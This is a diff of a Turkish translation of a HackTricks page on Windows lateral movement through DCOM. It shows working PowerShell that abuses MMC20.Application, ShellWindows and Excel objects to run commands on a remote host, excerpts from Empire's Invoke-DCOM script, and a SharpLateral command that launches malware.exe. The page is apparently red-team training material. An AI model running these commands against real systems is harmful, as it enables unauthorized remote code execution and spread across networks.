@@ -2,17 +2,17 @@
 
 <details>
 
-<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşün</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile</strong>!</summary>
+<summary><strong> sıfırdan kahramana AWS hacking öğrenin </strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* **Bir siber güvenlik şirketinde mi çalışıyorsunuz? Şirketinizin **HackTricks'te reklamını görmek ister misiniz**? ya da **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz**? [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
-* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
-* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) **Discord grubuna**](https://discord.gg/hRep4RUj7f) veya **telegram grubuna** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**'u takip edin**.
-* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile paylaşın**.
+* Bir **siber güvenlik şirketinde** mi çalışıyorsunuz? **şirketinizin HackTricks'te reklamını görmek** mi istiyorsunuz? veya **PEASS'in en son sürümüne erişim** mi istiyorsunuz ya da HackTricks'i **PDF olarak indirmek** mi istiyorsunuz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**PEASS Ailesini**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimizin**](https://opensea.io/collection/the-peass-family) koleksiyonu
+* [**resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bana** **Twitter'da** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Hacking ipuçlarınızı paylaşın,** [**hacktricks repo'suna**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo'suna**](https://github.com/carlospolop/hacktricks-cloud) **PR göndererek.**
 
 </details>
 
-**Try Hard Güvenlik Grubu**
+**Try Hard Security Group**
 
 <figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
@@ -22,27 +22,26 @@
 
 ## MMC20.Application
 
-**Bu teknik hakkında daha fazla bilgi için orijinal yazıya [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) adresinden bakın**
+**Bu teknik hakkında daha fazla bilgi için [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) adresindeki orijinal gönderiyi kontrol edin.**
 
-
-Dağıtılmış Bileşen Nesne Modeli (DCOM) nesneleri, nesnelerle ağ tabanlı etkileşimler için ilginç bir yetenek sunar. Microsoft, DCOM ve Bileşen Nesne Modeli (COM) için kapsamlı belgeler sağlar, [buradan DCOM için](https://msdn.microsoft.com/en-us/library/cc226801.aspx) ve [buradan COM için](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx) erişilebilir. Bir PowerShell komutu kullanarak DCOM uygulamalarının bir listesini alabilirsiniz:
+Dağıtılmış Bileşen Nesne Modeli (DCOM) nesneleri, nesnelerle ağ tabanlı etkileşimler için ilginç bir yetenek sunar. Microsoft, hem DCOM hem de Bileşen Nesne Modeli (COM) için kapsamlı belgeler sağlar, [DCOM için buradan](https://msdn.microsoft.com/en-us/library/cc226801.aspx) ve [COM için buradan](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx) erişilebilir. DCOM uygulamalarının bir listesi PowerShell komutu kullanılarak alınabilir:
 ```bash
 Get-CimInstance Win32_DCOMApplication
 ```
-COM nesnesi, [MMC Uygulama Sınıfı (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), MMC eklentisi işlemlerinin betikleme işlevini sağlar. Özellikle, bu nesne `Document.ActiveView` altında `ExecuteShellCommand` yöntemini içerir. Bu yöntem hakkında daha fazla bilgi [burada](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx) bulunabilir. Şunu çalıştırarak kontrol edin:
+COM nesnesi, [MMC Uygulama Sınıfı (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), MMC eklenti işlemlerinin betimlenmesini sağlar. Özellikle, bu nesne `Document.ActiveView` altında bir `ExecuteShellCommand` yöntemini içerir. Bu yöntem hakkında daha fazla bilgi [burada](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx) bulunabilir. Çalıştığını kontrol edin:
 
-Bu özellik, bir DCOM uygulaması aracılığıyla ağ üzerinden komutların yürütülmesini kolaylaştırır. Uzaktan yönetici olarak DCOM ile etkileşim kurmak için PowerShell şu şekilde kullanılabilir:
+Bu özellik, bir DCOM uygulaması aracılığıyla bir ağ üzerinde komutların yürütülmesini kolaylaştırır. DCOM ile uzaktan yönetici olarak etkileşimde bulunmak için PowerShell aşağıdaki gibi kullanılabilir:
 ```powershell
 [activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
 ```
-Bu komut DCOM uygulamasına bağlanır ve bir COM nesnesinin bir örneğini döndürür. Ardından ExecuteShellCommand yöntemi çağrılabilir ve uzak makinede bir işlemi yürütmek için kullanılabilir. İşlem aşağıdaki adımları içerir:
+Bu komut DCOM uygulamasına bağlanır ve COM nesnesinin bir örneğini döndürür. ExecuteShellCommand yöntemi daha sonra uzak ana bilgisayarda bir işlemi yürütmek için çağrılabilir. İşlem aşağıdaki adımları içerir:
 
-Yöntemleri kontrol et:
+Check methods:
 ```powershell
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com.Document.ActiveView | Get-Member
 ```
-RCE Al:
+RCE Elde Et:
 ```powershell
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com | Get-Member
@@ -53,27 +52,27 @@ ls \\10.10.10.10\c$\Users
 ```
 ## ShellWindows & ShellBrowserWindow
 
-**Bu teknik hakkında daha fazla bilgi için orijinal yazıya [buradan](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/) ulaşabilirsiniz.**
+**Bu teknik hakkında daha fazla bilgi için orijinal gönderiyi kontrol edin [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**
 
-**MMC20.Application** nesnesinin açık "LaunchPermissions" eksikliği tespit edildi ve bu varsayılan olarak Yöneticilere erişim izni veren izinlere sahiptir. Daha fazla ayrıntı için [buradaki](https://twitter.com/tiraniddo/status/817532039771525120) konuya bakılabilir ve [@tiraniddo](https://twitter.com/tiraniddo)’nın OleView .NET'in kullanımı önerilir.
+**MMC20.Application** nesnesinin açık "LaunchPermissions" eksikliği olduğu tespit edildi ve bu, Yöneticilerin erişimine izin veren varsayılan izinlere geri dönmektedir. Daha fazla ayrıntı için bir konu [burada](https://twitter.com/tiraniddo/status/817532039771525120) incelenebilir ve açık Launch Permission olmayan nesneleri filtrelemek için [@tiraniddo](https://twitter.com/tiraniddo)’nun OleView .NET'inin kullanılması önerilmektedir.
 
-Özel olarak, `ShellBrowserWindow` ve `ShellWindows` nesneleri, açık Launch Permissions'a sahip olmaması nedeniyle vurgulandı. `HKCR:\AppID\{guid}` altında `LaunchPermission` kaydının bulunmaması açık izinlerin olmadığını gösterir.
+Açık Launch Permissions eksikliği nedeniyle iki özel nesne, `ShellBrowserWindow` ve `ShellWindows`, vurgulanmıştır. `HKCR:\AppID\{guid}` altında bir `LaunchPermission` kayıt girişi olmaması, açık izinlerin olmadığını gösterir.
 
 ###  ShellWindows
-ProgID eksik olan `ShellWindows` için, .NET yöntemleri `Type.GetTypeFromCLSID` ve `Activator.CreateInstance` nesneyi AppID'si kullanarak oluşturmayı kolaylaştırır. Bu işlem, OleView .NET'in kullanımını gerektiren `ShellWindows` için CLSID'yi almak için kullanılır. Bir kere oluşturulduktan sonra, etkileşim `WindowsShell.Item` yöntemi aracılığıyla mümkün olur ve `Document.Application.ShellExecute` gibi yöntem çağrılarına yol açar.
+ProgID'si olmayan `ShellWindows` için, .NET yöntemleri `Type.GetTypeFromCLSID` ve `Activator.CreateInstance`, AppID'sini kullanarak nesne oluşturmayı kolaylaştırır. Bu işlem, `ShellWindows` için CLSID'yi almak üzere OleView .NET'i kullanır. Oluşturulduktan sonra, `WindowsShell.Item` yöntemi aracılığıyla etkileşim mümkündür ve bu, `Document.Application.ShellExecute` gibi yöntem çağrılarına yol açar.
 
-Örnek PowerShell komutları, nesneyi oluşturmak ve uzaktan komutları yürütmek için sağlanmıştır:
+Nesneyi oluşturmak ve komutları uzaktan çalıştırmak için örnek PowerShell komutları sağlanmıştır:
 ```powershell
 $com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
 $obj = [System.Activator]::CreateInstance($com)
 $item = $obj.Item()
 $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
 ```
-### Excel DCOM Nesneleri ile Yana Hareket
+### Lateral Movement with Excel DCOM Objects
 
-Yana hareket, DCOM Excel nesnelerini istismar ederek gerçekleştirilebilir. Detaylı bilgi için, Excel DDE'nin DCOM aracılığıyla yana hareket için nasıl kullanılabileceğine dair tartışmayı [Cybereason'un blogunda](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) okumanız önerilir.
+Lateral hareket, DCOM Excel nesnelerini istismar ederek gerçekleştirilebilir. Ayrıntılı bilgi için, DCOM üzerinden lateral hareket için Excel DDE'yi kullanma konusundaki tartışmayı [Cybereason'un blogunda](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) okumanız önerilir.
 
-Empire projesi, Excel'in DCOM nesnelerini manipüle ederek uzaktan kod yürütme (RCE) için Excel'in kullanımını gösteren bir PowerShell betiği sağlar. Aşağıda, Excel'in RCE için istismar edilmesi için farklı yöntemleri sergileyen [Empire'in GitHub deposunda](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) bulunan betikten alınan parçalar bulunmaktadır:
+Empire projesi, DCOM nesnelerini manipüle ederek uzaktan kod yürütme (RCE) için Excel'in kullanımını gösteren bir PowerShell betiği sağlar. Aşağıda, Excel'i RCE için istismar etmenin farklı yöntemlerini sergileyen [Empire'ın GitHub deposundaki](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) betikten alıntılar bulunmaktadır:
 ```powershell
 # Detection of Office version
 elseif ($Method -Match "DetectOffice") {
@@ -96,19 +95,19 @@ $Obj.DisplayAlerts = $false
 $Obj.DDEInitiate("cmd", "/c $Command")
 }
 ```
-### Yana Hareket için Otomasyon Araçları
+### Lateral Movement için Otomasyon Araçları
 
-Bu teknikleri otomatikleştirmek için iki araç öne çıkar:
+Bu teknikleri otomatikleştirmek için iki araç vurgulanmıştır:
 
-- **Invoke-DCOM.ps1**: Uzak makinelerde kod yürütmek için farklı yöntemleri çağırmayı basitleştiren Empire projesi tarafından sağlanan bir PowerShell betiği. Bu betik, Empire GitHub deposunda erişilebilir durumdadır.
+- **Invoke-DCOM.ps1**: Uzak makinelerde kod çalıştırmak için farklı yöntemlerin çağrılmasını basitleştiren Empire projesi tarafından sağlanan bir PowerShell betiği. Bu betik, Empire GitHub deposunda mevcuttur.
 
-- **SharpLateral**: Uzaktan kod yürütmek için tasarlanmış bir araç, aşağıdaki komutla kullanılabilir:
+- **SharpLateral**: Uzakta kod çalıştırmak için tasarlanmış bir araçtır ve şu komutla kullanılabilir:
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ```
 ## Otomatik Araçlar
 
-* [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) adlı Powershell betiği, diğer makinelerde kodu yürütmenin yorumlanmış tüm yollarını kolayca çağırmayı sağlar.
+* Powershell betiği [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1), diğer makinelerde kod çalıştırmanın tüm yorumlanan yollarını kolayca çağırmanıza olanak tanır.
 * Ayrıca [**SharpLateral**](https://github.com/mertdas/SharpLateral) kullanabilirsiniz:
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
@@ -124,16 +123,17 @@ SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Sıfırdan Kahraman'a AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'da takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
+{% endhint %}
